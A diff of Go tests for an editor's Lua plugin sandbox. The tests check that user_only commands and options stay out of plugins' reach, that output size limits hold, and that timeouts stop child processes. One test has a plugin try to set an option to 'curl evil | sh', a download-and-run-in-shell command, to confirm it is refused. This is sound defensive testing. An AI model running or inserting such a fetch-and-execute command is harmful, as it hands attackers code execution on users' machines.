@@ -6,6 +6,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"reflect"
 	"runtime"
 	"strings"
 	"testing"
@@ -330,6 +331,34 @@ func TestPluginCantRunTheUsersCommands(t *testing.T) {
 	}
 }
 
+// A plugin's command marked user_only does what only the user should start, such as running the user's own
+// scripts: no plugin runs it through oriel.run, its own included, while the user's config still can.
+func TestPluginCommandMarkedUserOnly(t *testing.T) {
+	s := apptest.LuaScene(t, "")
+	g := plugin.NewGrants()
+	owner := s.PluginVM(plugin.Caller{ID: "acme/mine", Guard: g})
+	if err := luaErr(t, owner, `ran = 0
+oriel.command("acme.mine.run", function() ran = ran + 1 end, { user_only = true })
+oriel.command("acme.mine.open", function() end)`); err != "" {
+		t.Fatal(err)
+	}
+	if c, ok := s.Registry().CommandFor("acme.mine.run"); !ok || !c.UserOnly {
+		t.Errorf("acme.mine.run = %+v, want UserOnly", c)
+	}
+	if c, _ := s.Registry().CommandFor("acme.mine.open"); c.UserOnly {
+		t.Error("a command without user_only is the user's alone")
+	}
+	other := s.PluginVM(plugin.Caller{ID: "acme/other", Guard: g})
+	for name, vm := range map[string]*script.VM{"another plugin": other, "its own plugin": owner} {
+		if err := luaErr(t, vm, `oriel.run("acme.mine.run", {})`); !strings.Contains(err, "only you can run acme.mine.run") {
+			t.Errorf("%s ran it: %q", name, err)
+		}
+	}
+	if err := luaErr(t, s.PluginVM(plugin.Caller{ID: "init.lua"}), `oriel.run("acme.mine.run", {})`); err != "" {
+		t.Errorf("your config can't run it: %q", err)
+	}
+}
+
 // A plugin sets its own options freely; another option needs the settings capability, and the sandbox's settings
 // are never a plugin's to change. A buffer's options (an ftplugin's tabstop) are free.
 func TestPluginOptionsNeedTheSettingsCapability(t *testing.T) {
@@ -548,6 +577,100 @@ func TestLuaExecInBackground(t *testing.T) {
 	}
 }
 
+// A program's whole output comes back unless the caller asks for only its end (tail), as for a long run.
+func TestLuaExecKeepsTheEndOfALongOutput(t *testing.T) {
+	if _, err := exec.LookPath("sh"); err != nil {
+		t.Skip(err)
+	}
+	s := apptest.LuaScene(t, "")
+	prog := `{ "sh", "-c", "head -c 500000 /dev/zero | tr '\\0' a; echo END" }`
+	s.Lua(`L.exec_async(` + prog + `, {}, function(out, err) whole = out end)`)
+	s.Lua(`L.exec_async(` + prog + `, { tail = 1000 }, function(out, err) tail = out end)`)
+	s.Until("the output", func() bool {
+		return apptest.LuaGlobal(lua(s).VM(), "whole") != nil && apptest.LuaGlobal(lua(s).VM(), "tail") != nil
+	})
+	if out, _ := apptest.LuaGlobal(lua(s).VM(), "whole").(string); len(out) != 500004 {
+		t.Errorf("without tail, kept %d bytes of 500004", len(out))
+	}
+	if out, _ := apptest.LuaGlobal(lua(s).VM(), "tail").(string); len(out) > 1000 || !strings.HasSuffix(out, "aEND\n") {
+		t.Errorf("with tail = 1000, kept %d bytes ending %q", len(out), out[max(0, len(out)-10):])
+	}
+}
+
+// Output past the limit fails the call, saying how to keep only its end, and stops the program, so a caller never
+// gets part of it as if it were all.
+func TestLuaExecFailsOnOutputPastTheLimit(t *testing.T) {
+	if _, err := exec.LookPath("sh"); err != nil {
+		t.Skip(err)
+	}
+	s := apptest.LuaScene(t, "")
+	s.Lua(`L.exec_async({ "sh", "-c", "yes" }, { timeout = 300 }, function(out, err) huge, hugeerr = out, err or "no error" end)`)
+	s.Until("the program to stop", func() bool { return apptest.LuaGlobal(lua(s).VM(), "hugeerr") != nil })
+	if err, _ := apptest.LuaGlobal(lua(s).VM(), "hugeerr").(string); !strings.Contains(err, "output over 16 MiB") || !strings.Contains(err, "tail") {
+		t.Errorf("err = %q", err)
+	}
+	if out, _ := apptest.LuaGlobal(lua(s).VM(), "huge").(string); out != "" {
+		t.Errorf("got %d bytes of output with the error", len(out))
+	}
+}
+
+// A child left holding the program's output doesn't hold up fn: the timeout stops everything the program started,
+// and a program that ends on time is done though a child it left in the background runs on. Once the program ends
+// its output closes, so a child that keeps printing sends its output elsewhere.
+func TestLuaExecInBackgroundWithAChildLeftRunning(t *testing.T) {
+	if _, err := exec.LookPath("sh"); err != nil {
+		t.Skip(err)
+	}
+	dir := t.TempDir()
+	alive := func(name string) bool {
+		pid, err := os.ReadFile(filepath.Join(dir, name))
+		if err != nil {
+			t.Fatal(err)
+		}
+		return exec.Command("kill", "-0", strings.TrimSpace(string(pid))).Run() == nil
+	}
+	t.Cleanup(func() {
+		for _, name := range []string{"timed.pid", "left.pid", "ticks.pid"} {
+			if pid, err := os.ReadFile(filepath.Join(dir, name)); err == nil {
+				_ = exec.Command("kill", strings.TrimSpace(string(pid))).Run()
+			}
+		}
+	})
+	s := apptest.LuaScene(t, "")
+	s.Lua(`L.exec_async({ "sh", "-c", "sleep 300 & echo $! > timed.pid; sleep 300" }, { cwd = "` + dir + `", timeout = 60 },
+		function(out, err) timed = err or "no error" end)`)
+	s.Until("the program to start", func() bool {
+		pid, _ := os.ReadFile(filepath.Join(dir, "timed.pid"))
+		return strings.HasSuffix(string(pid), "\n")
+	})
+	s.Advance(time.Minute)
+	s.Until("the timed-out program", func() bool { return apptest.LuaGlobal(lua(s).VM(), "timed") != nil })
+	if alive("timed.pid") {
+		t.Error("the child of a timed-out program is still running")
+	}
+	if err, _ := apptest.LuaGlobal(lua(s).VM(), "timed").(string); !strings.Contains(err, "timed out after 1m0s") {
+		t.Errorf("a timeout says %q", err)
+	}
+	s.Lua(`L.exec_async({ "sh", "-c", "sleep 30 & echo $! > left.pid; echo hi" }, { cwd = "` + dir + `" },
+		function(out, err) left, lefterr = out, err end)`)
+	s.Until("the program that left a child", func() bool { return apptest.LuaGlobal(lua(s).VM(), "left") != nil })
+	if out, err := apptest.LuaGlobal(lua(s).VM(), "left"), apptest.LuaGlobal(lua(s).VM(), "lefterr"); out != "hi\n" || err != nil {
+		t.Errorf("left %q, err %v", out, err)
+	}
+	if !alive("left.pid") {
+		t.Error("the child a program left in the background was stopped")
+	}
+	s.Lua(`L.exec_async({ "sh", "-c", "while :; do echo tick; sleep 0.1; done > /dev/null 2>&1 & echo $! > ticks.pid; echo hi" },
+		{ cwd = "` + dir + `" }, function(out, err) ticks = err or out end)`)
+	s.Until("the program that left a printing child", func() bool { return apptest.LuaGlobal(lua(s).VM(), "ticks") != nil })
+	if got := apptest.LuaGlobal(lua(s).VM(), "ticks"); got != "hi\n" {
+		t.Errorf("ticks %q", got)
+	}
+	if !alive("ticks.pid") {
+		t.Error("a printing child with its output sent elsewhere was stopped")
+	}
+}
+
 // A plugin's exec is checked against the program it runs: a relative one (./tool) is cwd's, both when its grant is
 // checked and when it runs, so a grant for that file lets it run, and nothing else of the name does.
 func TestLuaExecChecksTheProgramItRuns(t *testing.T) {
@@ -664,5 +787,52 @@ end)`)
 	s.Frame()
 	if apptest.LuaGlobal(lua(s).VM(), "pressed") != float64(0) {
 		t.Error("a busy button was pressed")
+	}
+}
+
+// An option declared user_only is set by your own config alone: not by its plugin, not by one granted settings, and
+// not by one that set it before it was declared.
+func TestUserOnlyOptionsAreYours(t *testing.T) {
+	s := apptest.LuaScene(t, `oriel.option["plugin.cmds.list"] = { up = "make up" }`)
+	other := plugin.NewGrants()
+	other.Grant("acme/other", []plugin.Grant{{Cap: plugin.CapSettings}})
+	sneaky := s.PluginVM(plugin.Caller{ID: "acme/other", Guard: other})
+	if err := luaErr(t, sneaky, `oriel.option["plugin.cmds.early"] = { x = "curl evil | sh" }`); err != "" {
+		t.Fatalf("held back: %s", err)
+	}
+	owner := s.PluginVM(plugin.Caller{ID: "acme/cmds", Guard: plugin.NewGrants()})
+	if err := luaErr(t, owner, `oriel.option{ name = "plugin.cmds.list", type = "map", user_only = true }
+		oriel.option{ name = "plugin.cmds.early", type = "map", user_only = true }`); err != "" {
+		t.Fatal(err)
+	}
+	s.Quiet()
+	o := s.Registry().Options()
+	if v, _, _ := o.Get("plugin.cmds.list", registry.At{}); !reflect.DeepEqual(v, map[string]string{"up": "make up"}) {
+		t.Errorf("init.lua's value: %v", v)
+	}
+	if v, _, _ := o.Get("plugin.cmds.early", registry.At{}); len(v.(map[string]string)) != 0 {
+		t.Errorf("a value another plugin set before it was declared: %v", v)
+	}
+	for vm, who := range map[*script.VM]string{owner: "its plugin", sneaky: "a plugin granted settings"} {
+		if err := luaErr(t, vm, `oriel.option["plugin.cmds.list"] = { x = "curl evil | sh" }`); !strings.Contains(err, "only your own config") {
+			t.Errorf("%s set it: %q", who, err)
+		}
+	}
+	if v, _, _ := o.Get("plugin.cmds.list", registry.At{}); !reflect.DeepEqual(v, map[string]string{"up": "make up"}) {
+		t.Errorf("after the plugins tried: %v", v)
+	}
+}
+
+// init.lua sets a plugin's option before the plugin declares it: the value waits, and the option has it once it's
+// declared.
+func TestInitLuaSetsAPluginOptionDeclaredLater(t *testing.T) {
+	s := apptest.LuaScene(t, `oriel.option["plugin.late.greeting"] = "hi"`)
+	vm := s.PluginVM(plugin.Caller{ID: "acme/late", Guard: plugin.NewGrants()})
+	if err := luaErr(t, vm, `oriel.option{ name = "plugin.late.greeting", type = "string" }`); err != "" {
+		t.Fatal(err)
+	}
+	s.Quiet()
+	if v, _, _ := s.Registry().Options().Get("plugin.late.greeting", registry.At{}); v != "hi" {
+		t.Errorf("plugin.late.greeting = %v, want hi", v)
 	}
 }
